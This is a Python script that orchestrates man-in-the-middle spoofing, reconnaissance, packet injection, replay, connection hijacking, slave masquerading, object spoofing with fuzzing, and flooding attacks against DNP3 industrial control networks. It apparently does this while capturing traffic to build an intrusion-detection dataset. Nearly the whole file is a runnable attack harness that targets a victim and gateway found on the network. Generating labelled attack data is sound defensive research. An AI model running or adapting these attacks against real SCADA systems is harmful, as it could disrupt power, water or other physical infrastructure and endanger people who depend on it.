from DNP3_Replay_flooder import DNP3_Replay_Flooder

__author__ = 'Nicholas Rodofile'

from master_thief_replay import *
from master_thief_replay_flooder import *
from DNP3_Injection_replay_updater import *
from DNP3_Injection_replay_updater_ack import *
from DNP3_Slave_object_spoof import *
from DNP3_Slave_Flooder import *
import datetime
import subprocess
from attack_timer import *
from random import randint, shuffle
from sniffing import *
from UDP_Server import UDP_Server


local = "dataset/"
directory = local + str(datetime.datetime.now().strftime("%Y%m%d%H%M%S"))
os.makedirs(directory)

subprocess.call("./networkrestart_attacker.sh")

minute = 60
hour = (60 * minute)
service_time = 3.0 * minute

log = []
sub_log = []

def timestamp_log(log_msg):
    log_item = str(datetime.datetime.now()) + " " +log_msg
    print log_item
    log.append(log_item)
    sub_log.append(log_item)


print datetime.datetime.utcnow(), "TCP/IP recon"
replay_file = 'mitm/replay_20160225_1634.pcap'
mst_replay_file = 'mitm/20160226-1656_sample_DNP3_for_replay.pcap'
mst_replay_file2 = 'mitm/20160226-1656_sample_DNP3_for_replay.pcap'


def injection_replay(victim, gateway):
    filter = "tcp and host " + gateway.ip_address
    injector = InjectionReplay(replay_file)
    sniff(iface='eth1', filter=filter, prn=injector.process_pkt, count=100)


def injection_replay_updater(victim, gateway):
    filter = "tcp and host " + gateway.ip_address
    injector = InjectionReplayUpdater(replay_file)
    sniff(iface='eth1', filter=filter, prn=injector.process_pkt, count=600)


def injection_replay_updater_ack(victim, gateway):
    filter = "tcp and host " + gateway.ip_address
    injector = InjectionReplayUpdaterAck(replay_file)
    sniff(iface='eth1', filter=filter, prn=injector.process_pkt, count=600)


def connection_thievery_with_replay(victim, gateway):
    filter = "tcp and host " + gateway.ip_address
    injector = MasterThiefReplay(victim, mst_replay_file)
    sniff(iface='eth1', filter=filter, prn=injector.process_pkt, count=100)


def connection_thievery_with_replay_flooding(victim, gateway):
    filter = "tcp and host " + gateway.ip_address
    injector2 = MasterThiefReplayFlooder(victim, mst_replay_file2)
    sniff(iface='eth1', filter=filter, prn=injector2.process_pkt, count=100)


def slave_masquerading(victim, gateway):
    subprocess.call("./networkrestart.sh")
    slave = Slave(victim, dnp3_port, service_time)
    DNP = slave.start()
    subprocess.call("./networkrestart_attacker.sh")


def master_replay(victim, gateway):
    replayer = DNP3_Replay(victim, 20000, mst_replay_file)
    replayer.start()


def master_replay_flooding(victim, gateway):
    replayer = DNP3_Replay_Flooder(victim, 20000, mst_replay_file)
    replayer.start()


def slave_masquerading_flooding(victim, gateway):
    subprocess.call("./networkrestart.sh")
    slave = DNP3_Slave_Flooder(victim, dnp3_port, service_time)
    DNP = slave.start()
    subprocess.call("./networkrestart_attacker.sh")


def slave_masquerading_Object_Spoof_Binary(victim, gateway):
    subprocess.call("./networkrestart.sh")
    slave = DNP3_Slave_Object_Spoof_BinaryStatus(victim, dnp3_port, service_time)
    DNP = slave.start()
    subprocess.call("./networkrestart_attacker.sh")

def slave_masquerading_Object_Spoof_Counter(victim, gateway):
    subprocess.call("./networkrestart.sh")
    slave = DNP3_Slave_Object_Spoof_CounterStatus(victim, dnp3_port, service_time)
    DNP = slave.start()
    subprocess.call("./networkrestart_attacker.sh")

def slave_masquerading_Object_Spoof_Binary_fuzz(victim, gateway):
    subprocess.call("./networkrestart.sh")
    slave = DNP3_Slave_Object_Spoof_BinaryStatus_fuzz(victim, dnp3_port, service_time)
    DNP = slave.start()
    subprocess.call("./networkrestart_attacker.sh")

def slave_masquerading_Object_Spoof_Counter_fuzz(victim, gateway):
    subprocess.call("./networkrestart.sh")
    slave = DNP3_Slave_Object_Spoof_CounterStatus_fuzz(victim, dnp3_port, service_time)
    DNP = slave.start()
    subprocess.call("./networkrestart_attacker.sh")

#DNP3_Slave_Object_Spoof

attacks = [
    master_replay,
    master_replay_flooding,
    injection_replay,
    injection_replay_updater,
    injection_replay_updater_ack,
    connection_thievery_with_replay,
    connection_thievery_with_replay_flooding,
    slave_masquerading,
    slave_masquerading_flooding,
    slave_masquerading_Object_Spoof_Binary,
    slave_masquerading_Object_Spoof_Counter,
    slave_masquerading_Object_Spoof_Binary_fuzz,
    slave_masquerading_Object_Spoof_Counter_fuzz
]

dataset_types = {
    "Rare" : {
        "attacks": 10,
        "min_time": 60 * 1,
        "max_time": 60 * 4,
    },

    "frequent" : {
        "attacks": 50,
        "min_time": 1,
        "max_time": 60,
    },
    "random" : {
        "attacks": 24,
        "min_time": 1,
        "max_time": 60 * 4,
    }
}

attack_classes = {
    "Master": [
        master_replay,
        master_replay_flooding,
        connection_thievery_with_replay,
    ],
    "Slave": [
        slave_masquerading,
        slave_masquerading_flooding,
        slave_masquerading_Object_Spoof_Binary,
        slave_masquerading_Object_Spoof_Counter,
        slave_masquerading_Object_Spoof_Binary_fuzz,
        slave_masquerading_Object_Spoof_Counter_fuzz
    ],
    "injection": [
        injection_replay,
        injection_replay_updater,
        injection_replay_updater_ack,
    ],
    "masquerading": [
        slave_masquerading,
        slave_masquerading_flooding,
        slave_masquerading_Object_Spoof_Binary,
        slave_masquerading_Object_Spoof_Counter,
        slave_masquerading_Object_Spoof_Binary_fuzz,
        slave_masquerading_Object_Spoof_Counter_fuzz
    ],
    "flooding": [
        slave_masquerading_flooding,
        master_replay_flooding,
        connection_thievery_with_replay_flooding,
    ],
    "replay": [
        master_replay,
        master_replay_flooding,
    ],
}


def run_attack(_victim, _gateway, attack):
    timestamp_log(attack.__name__ + " " + _victim.ip_address + " " + _gateway.ip_address + " START")
    attack(_victim, _gateway)
    timestamp_log(attack.__name__ + " " + _victim.ip_address + " " + _gateway.ip_address + " END")

interface = 'eth0'
verbose = 1
pkt_count = 100

interfaces = {
    'attacker': "eth0",
    'master': "eth1",
    'slave': "eth2"
}

gateway, victim, nodes = config_nodes_all(interface=interface, port="20000", init_nodes_func=init_dnp3_nodes)
mitm = DNP3_MITM(interface_selected=interface, gateway=gateway, victim=victim, verbose=verbose, pkt_count=pkt_count)
mitm.init_spoofing()

udp = UDP_Server(gateway, 23, 0)
udp_mask = Thread(target=udp.start)
udp_mask.daemon = True
udp_mask.start()

#sniffs interfaces for attacks
experiment_name = "test"
dataset_manager = DatasetManager(directory, interfaces, experiment_name)
dataset_manager.start()
attack_countdown(minute)

DNP3_nodes_found = []
max_time = 4 # an hour max
for n in nodes.keys():
    sleep(1)
    if nodes[n].status == "open":
        mitm.victim = nodes[n]
        mitm.init_spoofing()
        timestamp_log("DNP3_Recon" + " " + nodes[n].ip_address)
        master = Master(nodes[n], dnp3_port)
        DNP = master.start()
        DNP3_nodes_found.append(DNP), "Address discovery"
        timestamp_log("DNP3_Recon" + " " + nodes[n].ip_address + " END")
    else:
        print n, "port closed"
print "--------------- DNP3 Nodes Found ----------------"
print "#################################################"
if len(DNP3_nodes_found) == 0:
    print "No DNP3 Nodes"
for n_d in DNP3_nodes_found:
    print n_d["IP"], ": Master:", n_d["master"], " Slave:", n_d["slave"]
print "#################################################"


for i in range(0, 2):
    shuffle(attacks)
    attack = attacks[randint(0, (len(attacks)-1))]
    run_attack(victim, gateway, attack)
    sleep_time = (randint(1, max_time))
    attack_countdown(sleep_time * minute)

UDP_SERVER_STOP = True
dataset_manager.stop()

log_file = directory+"/Attack_script_log.log"
file = open(log_file, 'w')

for l in log:
    file.write(l + "\n")
file.close()

print "Log file:", log_file
